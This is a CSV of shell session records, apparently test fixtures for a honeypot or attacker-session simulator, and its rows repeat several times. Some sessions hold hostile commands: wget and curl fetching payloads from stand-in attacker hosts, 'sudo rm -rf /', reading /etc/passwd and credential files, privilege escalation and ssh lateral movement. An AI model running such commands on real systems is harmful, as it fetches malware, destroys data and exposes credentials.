session_id,commands,timing_buckets,errors
test-session,whoami,medium,false
db-test,whoami,medium,false
test_session,ls,medium,false
test_session,pwd,medium,false
test_session,whoami,medium,false
test_session,cd /,medium,false
test_session,cd / pwd,medium medium,false false
test_session,cat credentials.txt,medium,false
test_session,unknown_command_xyz,medium,false
persistent_test,ls,medium,false
persistent_test,ls pwd,medium medium,false false
malicious_session,wget http://evil.com/malware,medium,false
malicious_session,wget http://evil.com/malware curl -O http://attacker.com/payload,medium medium,false false
malicious_session,wget http://evil.com/malware curl -O http://attacker.com/payload ssh [email],medium medium medium,false false false
malicious_session,wget http://evil.com/malware curl -O http://attacker.com/payload ssh [email] sudo rm -rf /,medium medium medium medium,false false false false
history_test,ls,medium,false
history_test,ls pwd,medium medium,false false
history_test,ls pwd whoami,medium medium medium,false false false
history_test,ls pwd whoami ls -la,medium medium medium medium,false false false false
history_test,ls pwd whoami ls -la cat /etc/passwd,medium medium medium medium medium,false false false false false
history_test,ls pwd whoami ls -la cat /etc/passwd history,medium medium medium medium medium medium,false false false false false false
security_test,cat /home/admin/credentials.txt,medium,false
priv_esc_test,sudo su -,medium,false
lateral_test,ssh user@192.168.1.50,medium,false
realism_test,ls /,medium,false
sysinfo_test,uname -a,medium,false
sysinfo_test,uname -a id,medium medium,false false
sysinfo_test,uname -a id ps,medium medium medium,false false false
sysinfo_test,uname -a id ps netstat,medium medium medium medium,false false false false
env_test,env,medium,false
test-session,whoami,medium,false
db-test,whoami,medium,false
test_session,ls,medium,false
test_session,pwd,medium,false
test_session,whoami,medium,false
test_session,cd /,medium,false
test_session,cd / pwd,medium medium,false false
test_session,cat credentials.txt,medium,false
test_session,unknown_command_xyz,medium,false
persistent_test,ls,medium,false
persistent_test,ls pwd,medium medium,false false
malicious_session,wget http://evil.com/malware,medium,false
malicious_session,wget http://evil.com/malware curl -O http://attacker.com/payload,medium medium,false false
malicious_session,wget http://evil.com/malware curl -O http://attacker.com/payload ssh [email],medium medium medium,false false false
malicious_session,wget http://evil.com/malware curl -O http://attacker.com/payload ssh [email] sudo rm -rf /,medium medium medium medium,false false false false
history_test,ls,medium,false
history_test,ls pwd,medium medium,false false
history_test,ls pwd whoami,medium medium medium,false false false
history_test,ls pwd whoami ls -la,medium medium medium medium,false false false false
history_test,ls pwd whoami ls -la cat /etc/passwd,medium medium medium medium medium,false false false false false
history_test,ls pwd whoami ls -la cat /etc/passwd history,medium medium medium medium medium medium,false false false false false false
security_test,cat /home/admin/credentials.txt,medium,false
priv_esc_test,sudo su -,medium,false
lateral_test,ssh user@192.168.1.50,medium,false
realism_test,ls /,medium,false
sysinfo_test,uname -a,medium,false
sysinfo_test,uname -a id,medium medium,false false
sysinfo_test,uname -a id ps,medium medium medium,false false false
sysinfo_test,uname -a id ps netstat,medium medium medium medium,false false false false
env_test,env,medium,false
test-session,whoami,medium,false
db-test,whoami,medium,false
test_session,ls,medium,false
test_session,pwd,medium,false
test_session,whoami,medium,false
test_session,cd /,medium,false
test_session,cd / pwd,medium medium,false false
test_session,cat credentials.txt,medium,false
test_session,unknown_command_xyz,medium,false
persistent_test,ls,medium,false
persistent_test,ls pwd,medium medium,false false
malicious_session,wget http://evil.com/malware,medium,false
malicious_session,wget http://evil.com/malware curl -O http://attacker.com/payload,medium medium,false false
malicious_session,wget http://evil.com/malware curl -O http://attacker.com/payload ssh [email],medium medium medium,false false false
malicious_session,wget http://evil.com/malware curl -O http://attacker.com/payload ssh [email] sudo rm -rf /,medium medium medium medium,false false false false
history_test,ls,medium,false
history_test,ls pwd,medium medium,false false
history_test,ls pwd whoami,medium medium medium,false false false
history_test,ls pwd whoami ls -la,medium medium medium medium,false false false false
history_test,ls pwd whoami ls -la cat /etc/passwd,medium medium medium medium medium,false false false false false
history_test,ls pwd whoami ls -la cat /etc/passwd history,medium medium medium medium medium medium,false false false false false false
security_test,cat /home/admin/credentials.txt,medium,false
priv_esc_test,sudo su -,medium,false
lateral_test,ssh user@192.168.1.50,medium,false
realism_test,ls /,medium,false
sysinfo_test,uname -a,medium,false
sysinfo_test,uname -a id,medium medium,false false
sysinfo_test,uname -a id ps,medium medium medium,false false false
sysinfo_test,uname -a id ps netstat,medium medium medium medium,false false false false
env_test,env,medium,false
attacker-001,wget http://evil-site.com/malware.sh,medium,false
